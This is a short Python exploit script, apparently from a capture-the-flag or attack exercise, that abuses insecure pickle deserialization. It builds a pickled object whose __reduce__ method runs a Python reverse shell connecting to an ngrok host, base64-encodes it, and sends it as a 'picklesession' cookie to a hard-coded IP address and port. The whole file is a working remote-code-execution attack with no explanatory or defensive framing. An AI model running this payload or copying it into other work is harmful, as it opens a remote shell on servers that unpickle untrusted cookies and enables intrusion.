#!/usr/bin/env python3
import pickle
import os
import base64
import requests

class RCE(object):
    def __reduce__(self):
        return (os.system, (
            '''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ngrok.io", 16173));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',
        ))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
    print(f'[*] Payload: {pickledPayload}')

    URL = 'http://35.209.254.29:33623'
    cookie = {
        'picklesession': pickledPayload
    }

    print('[*] Request result:')
    orderRequestResult = requests.get(URL, cookies=cookie)
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
